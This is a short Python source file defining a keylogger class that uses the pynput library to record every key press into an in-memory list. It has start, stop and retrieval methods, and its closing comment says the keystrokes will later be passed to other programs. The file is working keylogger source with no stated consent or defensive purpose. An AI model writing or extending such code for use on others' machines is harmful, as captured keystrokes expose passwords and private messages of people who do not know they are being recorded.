from pynput import keyboard

class IKeyLogger:
    def __init__(self):
        self.logged_keys = []
        self.listener = keyboard.Listener(on_press=self.on_press)
 
    def on_press(self, key):
        self.logged_keys.append(str(key))
    def start_logging(self):
        
        self.listener.start()

    def stop_logging(self):
        self.listener.stop()

    def get_logged_keys(self) -> list[str]:
        return self.logged_keys

"""
stores keystrokes in memory (not in a file yet). to be used later by the other programs
"""
